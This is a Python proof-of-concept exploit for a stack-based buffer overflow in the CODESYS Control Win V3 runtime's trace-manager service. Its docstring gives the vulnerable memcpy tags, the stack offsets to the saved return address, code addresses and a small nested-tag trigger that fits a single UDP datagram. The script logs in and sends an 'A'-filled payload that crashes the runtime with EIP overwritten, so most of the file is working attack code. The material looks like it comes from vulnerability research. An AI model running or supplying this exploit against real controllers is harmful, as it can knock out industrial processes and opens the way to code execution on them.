#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CmpTraceMgr stack-overflow PoC — CODESYS Control Win V3 3.5.18.20.

Vulnerability
-------------
`TraceMgrServiceHandler` (CmpTraceMgr, service group 0x000F) parses the request
body as a tag stream and hands several tag payloads straight to `memcpy` with
the *attacker-supplied* tag length and a small stack buffer as destination.
Nothing between the tag parse and the copy bounds-checks the length — the parse
only proves the bytes are present in the received body, never that they fit.

    top level       tag 19 (0x13)  ->  memcpy(v26, src, len)   v26[4]   @ ebp-0xBC0
                    tag 20 (0x14)  ->  memcpy(v27, src, len)   v27[4]   @ ebp-0xBBC
                    tag 21 (0x15)  ->  memcpy(v28, src, len)   v28[20]  @ ebp-0xBB8
    in container    tag 48 (0x30)  ->  memcpy(v34, src, len)   v34[8]   @ ebp-0x1C
    0x86 (134)      tag 51 (0x33)  ->  memcpy(&v35, src, len)  v35(u32) @ ebp-0x14

The FreeBuf article calls out 19/20/21 ("当输入参数为19、20、21等值时进入memcpy
分支") and reproduces with 0x18AC bytes of 'A'.  The nested pair matters more in
practice: because container 0x86 / tag 0x30 is exactly what a *legitimate*
TRACE_CONFIGURE body carries (`... 86 01 e0 00 30 84 80 00 0a 00 00 00 ...`),
a well-formed-looking request reaches the same bug, and its destination sits
only 32 bytes from the saved return address instead of ~3 KB.

Distance from each destination to the saved return address
    tag 48 -> [ebp-0x1C]   0xC04 - 0xBE4 =   32 bytes   <- default trigger
    tag 51 -> [ebp-0x14]   0xC04 - 0xBEC =   24 bytes
    tag 19 -> [ebp-0xBC0]  0xC04 - 0x040 = 3012 bytes
    tag 20 -> [ebp-0xBBC]  0xC04 - 0x044 = 3008 bytes
    tag 21 -> [ebp-0xBB8]  0xC04 - 0x048 = 3004 bytes

The overflow does not touch the live tag-reader struct (ebx/`v30` @ ebp-0x538),
so the handler runs to its epilogue and dies on `ret`: EIP = 0x41414141.

Transport caveat (why the article's 0x18AC single-shot body cannot be replayed)
    The runtime's UDP frame buffer is ~512 bytes: a request whose *services*
    block exceeds ~472 bytes in one BLK frame is dropped silently, and a
    fragmented (`blk_first` + `blk_cont`) request is answered with a 0x84
    channel close.  Measured against this build: body 452B answers, body 484B
    does not; an otherwise byte-identical 2-frame split is refused outright.
    The IDE's 93 KB fragmented app download in 1.pcapng ran from UDP **1743**
    (CODESYS GatewayService), so the reassembly policy is evidently per-port —
    but 1743 is held by GatewayService here, and faking the datagram's endpoint
    index while bound to 1741 is rejected.  Hence the nested trigger, which
    needs only a 47-byte body and fits one datagram.

Addresses (3.5.18.20, image base 0x008A0000; the IDA dump is rebased by +0x5F0000)
    TraceMgrServiceHandler     0x00A88580   (IDA 0x1078580)
    call memcpy, tag 48        0x00A88833   (IDA 0x1078833)
    call memcpy, tag 19        0x00A8871B   (IDA 0x107871B)

Usage
    python trace_poc.py 192.168.125.129                 # nested tag 48, 64 A's
    python trace_poc.py 192.168.125.129 --tag 51        # 24 bytes to EIP
    python trace_poc.py 192.168.125.129 --tag 19 --length 400   # top-level, fits
    python trace_poc.py 192.168.125.129 --dry-run

The runtime is expected to *not* answer — it dies on the overwritten return
address.  Confirm the root cause in x64dbg at 0x00A88833 (tag 48) or
0x00A8871B (tag 19).
"""

import argparse
import socket
import sys

from codesys_udp_ds import (
    CodesysClient, GRP_TRACE, TRACE_CONFIGURE, STATUS_OK, tag, parent_tag,
    parse_tags, dump_tags, status_of, build_ack,
)

#: trigger tag -> (container to nest it in, destination, bytes to saved EIP)
TRIGGERS = {
    48: (0x86, "memcpy(v34, src, len)   v34[8]  @ ebp-0x1C", 32),
    51: (0x86, "memcpy(&v35, src, len)  v35 u32 @ ebp-0x14", 24),
    19: (None, "memcpy(v26, src, len)   v26[4]  @ ebp-0xBC0", 3012),
    20: (None, "memcpy(v27, src, len)   v27[4]  @ ebp-0xBBC", 3008),
    21: (None, "memcpy(v28, src, len)   v28[20] @ ebp-0xBB8", 3004),
}

DEFAULT_TAG = 48
DEFAULT_LENGTH = 64

#: largest services block the runtime accepts in a single BLK frame
SINGLE_FRAME_SERVICES_MAX = 472


def build_body(tag_id, length, fill=b"A"):
    """Wrap `length` bytes of filler in the trigger tag.

    Tag 48/51 live inside container 0x86 — the shape a real TRACE_CONFIGURE
    body uses.  `parent_tag` supplies the container header; `tag()` writes the
    length as the 3-byte padded LEB128 the runtime itself emits (64 -> `c0 80
    00`), which parses identically to a minimal encoding.
    """
    inner = tag(tag_id, fill * length)
    container = TRIGGERS[tag_id][0]
    return parent_tag(container, inner) if container else inner


def quiesce(c):
    """ACK the last response and drop retransmits already in the socket.

    `CodesysClient.recv_services()` only ACKs multi-frame responses, so the
    single-frame reply to `app_login()` is left unacknowledged and the runtime
    keeps resending it.  Without this the PoC's `call()` would read that stale
    reply and report "the runtime answered" even though the process is gone.
    """
    if c.rx_blk:
        c.send_raw(build_ack(c.channel_id, c.token, c.rx_blk))
    dropped = 0
    while True:
        try:
            c.recv_raw(timeout=0.5)
            dropped += 1
        except (TimeoutError, socket.timeout, OSError):
            return dropped


def main():
    ap = argparse.ArgumentParser(
        description="CmpTraceMgr (0x000F/0x0002) memcpy stack-overflow PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("target", help="runtime IPv4 address, e.g. 192.168.125.129")
    ap.add_argument("--port", type=int, default=1740)
    ap.add_argument("--user", default="test")
    ap.add_argument("--password", default="test")
    ap.add_argument("--app-name", default="App")
    ap.add_argument("--local-port", type=int, default=1741,
                    help="client UDP port (1741/1742/1743; 1743 is the Gateway)")
    ap.add_argument("--tag", type=int, default=DEFAULT_TAG,
                    choices=sorted(TRIGGERS),
                    help=f"vulnerable tag id (default {DEFAULT_TAG})")
    ap.add_argument("--length", type=lambda s: int(s, 0), default=None,
                    help="filler length in bytes "
                         f"(default {DEFAULT_LENGTH}, or 4 past the EIP offset "
                         "for the chosen tag)")
    ap.add_argument("--dry-run", action="store_true",
                    help="build and print the request, do not send")
    args = ap.parse_args()

    container, what, to_eip = TRIGGERS[args.tag]
    length = args.length if args.length is not None else max(DEFAULT_LENGTH,
                                                             to_eip + 4)
    body = build_body(args.tag, length)
    services_len = len(body) + 20

    print("========== CmpTraceMgr stack overflow PoC ==========")
    print(f"  service : group 0x{GRP_TRACE:04X} / service 0x{TRACE_CONFIGURE:04X}"
          f"  (TraceMgrSrvPacketCreate)")
    print(f"  trigger : tag {args.tag}"
          + (f" nested in container 0x{container:02x}" if container else "")
          + f"  ->  {what}")
    print(f"  offset  : {to_eip} bytes from the destination to the saved EIP")
    print(f"  payload : {length} bytes of {b'A'!r} "
          f"({length - to_eip:+d} past EIP), body {len(body)}B, "
          f"services {services_len}B")
    if length <= to_eip:
        print(f"  [!] {length} <= {to_eip}: this will NOT reach the return "
              f"address")
    if services_len > SINGLE_FRAME_SERVICES_MAX:
        print(f"  [!] services block is {services_len}B but the runtime only "
              f"accepts ~{SINGLE_FRAME_SERVICES_MAX}B per datagram, and refuses\n"
              f"      fragmented requests from this port — the packet will be "
              f"dropped.  Use --tag 48 or --tag 51 for a small trigger.")
    if args.dry_run:
        print(f"\n  body ({len(body)}B):\n    {body[:64].hex(' ')}"
              + (" ..." if len(body) > 64 else ""))
        return 0

    # ---- handshake: channel -> session -> challenge -> login -> app login ----
    c = CodesysClient(args.target, args.port, "0.0.0.0", args.local_port,
                      verbose=True)
    try:
        c.open_channel()
        c.create_session()
        pem, challenge = c.get_public_key()
        status, _ = c.login(pem, challenge, args.user, args.password)
        if status != STATUS_OK:
            print(f"[-] device login failed (status={status}); the runtime will "
                  f"reject the trace request")
            return 1
        c.app_login(args.app_name)
    except Exception as e:
        print(f"\n[-] handshake failed: {e}")
        c.close()
        return 1

    # ---- fire ----
    print("\n========== sending PoC ==========")
    c.verbose = False                     # a multi-KB hex dump helps nobody
    print(f"  quiesced ({quiesce(c)} stale datagram(s) dropped)")
    try:
        hdr, resp = c.call(GRP_TRACE, TRACE_CONFIGURE, body)
    except (TimeoutError, socket.timeout):
        print("[+] no response to the PoC request.")
    except OSError as e:
        print(f"[+] connection went away during the PoC: {e}")
    else:
        print(f"[-] the runtime answered: group=0x{hdr['group']:04x} "
              f"service=0x{hdr['service_id']:04x} {len(resp)}B status="
              f"{status_of(parse_tags(resp))} — it did not crash.")
        dump_tags(parse_tags(resp))
        print("    Check the tag id, the payload length and that this build is "
              "really 3.5.18.20.")
        c.close()
        return 1

    print("\n========== RESULT ==========")
    print(f"  Sent {len(body)}B body (tag {args.tag}, {length} x 'A') to "
          f"channel 0x{c.channel_id:08x} / session 0x{c.session_id:08x}.")
    print("  No reply — which is what a dead process looks like from here.")
    print("  Confirm in x64dbg:")
    print(f"    - breakpoint 0x00A88833 (tag 48) / 0x00A8871B (tag 19) hits")
    print(f"    - the destination is [ebp-{'1C' if args.tag in (48, 51) else 'BC0'}"
          f"] and the size argument is {length}")
    print("    - execution faults with EIP = 0x41414141")
    return 0


if __name__ == "__main__":
    sys.exit(main())
